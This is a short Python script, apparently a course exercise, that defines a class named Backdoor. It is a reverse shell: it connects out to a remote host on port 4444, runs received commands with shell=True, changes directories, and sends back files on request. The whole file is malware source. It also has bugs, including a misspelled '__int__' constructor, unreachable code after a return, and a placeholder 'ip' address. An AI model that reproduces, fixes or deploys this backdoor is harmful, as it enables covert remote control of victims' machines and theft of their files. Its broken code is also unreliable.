import socket
import subprocess
import os
import json
import base64


class Backdoor:
	def __int__(self, ip , port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def execute_system_command(command):

		return subprocess.check_output(command, shell=True)
		print('current path', os.getcwd())
		size = os.path.getsize('readmy.txt')
		click = round(size / 1024)
		
		print(click," --- раз надо нажать enter")
	    
		return click

	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())


	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = self.connection.recv(1024)
				return json.loads(json_data)
			except json.decoder.JSONDecodeError:
				continue

	def change_working_directory_to(self,path):
		os.chdir(path)
		return  ('[+] Changing working directory to' + path).encode()
	
	def read_file(self, path):
		with open(path, 'rb') as f:
			return f.read()
			#обращем в коодировку

	def run(self):
		while True:
			command = self.reliable_receive()

			if command[0] == 'exit':
				self.connection.close()
				exit()
			elif command[0] == 'cd' and len(command) > 1:
				self.change_working_directory_to(command[1])
				command_result = self.change_working_directory_to(command[1])
				print('==command_result==')
			elif command[0] == 'download':
				command_result = self.read_file(command[1])

			else:
				command_result = self.execute_system_command(command)
			self.reliable_send(command_result)
		self.connection.close()

my_bd = Backdoor("ip", 4444)
my_bd.run()